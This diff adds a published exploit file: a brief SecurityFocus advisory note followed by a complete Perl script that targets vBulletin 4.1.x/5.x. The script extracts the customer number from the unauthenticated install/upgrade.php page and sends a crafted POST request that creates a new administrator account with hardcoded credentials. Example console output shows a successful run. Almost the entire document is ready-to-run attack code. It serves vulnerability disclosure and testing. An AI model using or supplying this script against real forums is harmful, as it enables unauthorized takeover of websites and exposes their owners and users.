@@ -1,0 +1,142 @@
+source: http://www.securityfocus.com/bid/62909/info
+
+vBulletin is prone to a security-bypass vulnerability.
+
+Successful exploits can allow attackers to bypass certain security restrictions and perform unauthorized actions. 
+
+#!/usr/bin/perl
+#
+# Title: vBulletin remote admin injection exploit
+# Author: Simo Ben youssef
+# Contact: Simo_at_Morxploit_com
+# Coded: 17 September 2013
+# Published: 24 October 2013
+# MorXploit Research
+# http://www.MorXploit.com
+#
+# Vendor: vBulletin (www.vbulletin.com)
+# Version: 4.1.x / 5.x.x
+# Vulnerability: Remote admin injection
+# Severity: High
+# Status: Confirmed
+#
+# Exploit code description:
+# Perl code to inject a new admin account through upgrade.php script.
+#
+# Vulnerability details:
+# upgrade.php is vulnerable to a new admin account injection, the script doesn't require autentication when upgrading
+# it only requires the customer number which can be extracted through the same script source code.
+#
+# Fix:
+# Rename or delete the install folder until a fix is released.
+#
+# Author disclaimer:
+# The information contained in this entire document is for educational, demonstration and testing purposes only.
+# Author cannot be held responsible for any malicious use. Use at your own risk.
+#
+# Exploit usage:
+#
+# root@MorXploit:/home/simo/morx# perl morxvb.pl localhost
+#
+# ===================================================
+# --- vbulletin admin injection exploit
+# --- By: Simo Ben youssef <simo_at_morxploit_com>
+# --- MorXploit Research www.MorXploit.com
+# ===================================================
+# [*] Trying to get customer number ... hold on!
+# [+] Got xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!
+# [*] Trying to MorXploit localhost ... hold on!
+# [+] Admin account successfully injected!
+# [+] Admin: MorXploit
+# [+] Pass: m0rxpl017
+
+use strict;
+use IO::Socket;
+
+if(!defined($ARGV[0])) {
+
+system ('clear');
+print "\n";
+print "===================================================\n";
+print "--- vbulletin admin injection exploit\n";
+print "--- By: Simo Ben youssef <simo_at_morxploit_com>\n";
+print "--- MorXploit Research www.MorXploit.com\n";
+print "===================================================\n";
+
+print "--- Usage: perl $0 target\n\n";
+exit; }
+
+my $site = $ARGV[0];
+
+##### Change these as needed #####
+my $user = "MorXploit";
+my $passwd = "m0rxpl017";
+my $email = "dev%40null.com";
+my $path = "/install/upgrade.php";
+##################################
+
+my $accept = "Accept: */*";
+my $ct = "application/x-www-form-urlencoded";
+my $port = "80";
+
+system ('clear');
+print "\n";
+print "===================================================\n";
+print "--- vbulletin admin injection exploit\n";
+print "--- By: Simo Ben youssef <simo_at_morxploit_com>\n";
+print "--- MorXploit Research www.MorXploit.com\n";
+print "===================================================\n";
+
+my $sock = new IO::Socket::INET ( PeerAddr => "$site",PeerPort => "$port",Proto => "tcp"); die "\n[-] Can't creat socket: $!\n" unless $sock;
+
+print "[*] Trying to get customer number ... hold on!\n";
+
+print $sock "GET $path HTTP/1.1\n";
+print $sock "Host: $site\n";
+print $sock "$accept\n";
+print $sock "Content-Type: $ct\n";
+print $sock "Connection: Close\n\n";
+
+my $gotcn;
+while(my $cn = <$sock>) {
+if ($cn =~ /CUSTNUMBER = \"(.*?)\"/){
+$gotcn = $1;
+}
+}
+
+if (!defined $gotcn) {
+print "[-] Failed to get customer number! Nulled? Going to try anyway!\n";
+}
+else {
+print "[+] Got $gotcn!\n";
+}
+my $xploit = "ajax=1&version=install&checktable=false&firstrun=false&step=7&startat=0
+&only=false&customerid=$gotcn&options[skiptemplatemerge]=0&response=yes&
+htmlsubmit=1&htmldata[username]=$user&htmldata[password]=$passwd&htmldat
+a[confirmpassword]=$passwd&htmldata[email]=$email";
+my $cl = length($xploit);
+my $content = "Content-Length: $cl";
+
+my $sock2 = new IO::Socket::INET ( PeerAddr => "$site",PeerPort => "$port",Proto => "tcp"); die "\n[-] Can't creat socket: $!\n" unless $sock;
+
+print "[*] Trying to MorXploit $site ... hold on!\n";
+
+print $sock2 "POST $path HTTP/1.1\n";
+print $sock2 "Host: $site\n";
+print $sock2 "$accept\n";
+print $sock2 "Cookie: bbcustomerid=$gotcn\n";
+print $sock2 "Content-Length: $cl\n";
+print $sock2 "Content-Type: $ct\n";
+print $sock2 "Connection: Close\n\n";
+print $sock2 "$xploit\n\n";
+
+while(my $result = <$sock2>){
+if ($result =~ /Administrator account created/) {
+print "[+] Admin account successfully injected!\n";
+print "[+] Admin: $user\n";
+print "[+] Pass: $passwd\n";
+exit;
+}
+}
+print "[-] Failed, something went wrong\n";
+exit;
